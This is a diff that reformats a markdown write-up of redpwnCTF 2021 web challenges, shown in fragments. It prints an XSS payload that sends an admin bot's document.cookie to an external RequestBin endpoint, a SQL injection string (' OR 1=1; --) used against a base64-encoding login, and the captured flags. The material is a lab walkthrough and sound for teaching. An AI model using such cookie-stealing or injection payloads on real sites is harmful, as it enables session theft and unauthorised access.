@@ -1,7 +1,8 @@
-*2021-07-09*
-
-#ctf-writeup 
-
+---
+tags:
+  - ctf-writeup
+date: 2021-07-09
+---
 Link: https://ctf.redpwn.net/
 
 ***
@@ -16,7 +17,7 @@ Ah, the classic pastebin. Can you get the admin's cookies?
 ## Solution
 For this challenge, we are given two links. One is a mock pastebin website where you can enter text, submit it, and be given a link to where it persists. The second link is a website that allows you to redirect a bot to a specific URL.
 
-Based on the nature of the websites, and the description of the challenge, it's fairly clear that this is a classic XXS challenge. The mock pastebin website allows JavaScript that we write to be injected into the DOM of whoever visits the page. We can exploit this to steal a cookie of whoever visits the page with our JavaScript injection. 
+Based on the nature of the websites, and the description of the challenge, it's fairly clear that this is a classic XXS challenge. The mock pastebin website allows JavaScript that we write to be injected into the DOM of whoever visits the page. We can exploit this to steal a cookie of whoever visits the page with our JavaScript injection.
 
 First, I created a public [RequestBin](https://requestbin.com/) as an endpoint for our exploit. Then I created a new paste with the following content:
 
@@ -27,7 +28,7 @@ document.write('<img src="https://en2enweozjgy8.x.pipedream.net?c='+document.coo
 ```
 
 I then took the link to the newly created paste and fed it to the admin bot. The flag then appeared as a GET parameter in the RequestBin.
-![[../Files/inspect-me-requestbin.png]]
+![[inspect-me-requestbin.png]]
 
 When the admin bot visits our link the JavaScript within the `<script>` tag gets run. The script tries to create an image with the source of our RequestBin and the admin's cookie as GET parameter. The admin bot will then make a request to our endpoint which we can capture, thus exposing the cookie which contains the flag.
 
@@ -46,7 +47,7 @@ Just learned about encryption—now, my website is unhackable!
 ## Solution
 For this challenge, we are given a web page with a simple login screen. Attempting to log in with some random credentials will show the SQL query that was run by the backend.
 
-![[../Files/secure-login.png]]
+![[secure-login.png]]
 
 We are also given the application code in `index.js`. Reading through this code we can see that it is SQL injectable:
 
@@ -73,7 +74,7 @@ app.post('/login', (req, res) => {
 
 Attempting to SQL inject doesn't seem to work. Trying to use the username `' OR 1=1;  --  ` produces the following output:
 
-![[../Files/secure-login-inject.png]]
+![[secure-login-inject.png]]
 
 The username injection here seems to be encoded in base64 which is preventing the injection from completing. The source code of the login page supports this, showing that the username and password inputs are base64 encoded on the client-side before being sent to the server using the `btoa()` function.
 
@@ -120,7 +121,7 @@ Found. Redirecting to /?message=flag%7B50m37h1n6_50m37h1n6_cl13n7_n07_600d%7D
 
 We can then use a tool like [CyberChef](https://gchq.github.io/CyberChef/) to easily decode the flag.
 
-![[../Files/secure-cyberchef.png]]
+![[secure-cyberchef.png]]
 
 ## Flag
 `flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d} `
@@ -137,7 +138,7 @@ Aaron has a message for the cool kids. For support, DM BrownieInMotion.
 ## Solution
 For this challenge, we are given another simple login screen. It also looks like we can register an account. If we register an account and log in, the following message is shown:
 
-![[../Files/cool-login-message.png]]
+![[cool-login-message.png]]
 
 This indicates that there is a user called ginkoid that we need to log in as. Trying to register a new user with this account will tell us that the username is taken, indicating that the user does exist in the database.
 
@@ -267,5 +268,3 @@ $ cat flag-at-the-end-of-file.mp3
 
 ## Flag
 `flag{44r0n_s4ys_s08r137y_1s_c00l}`
-
-***
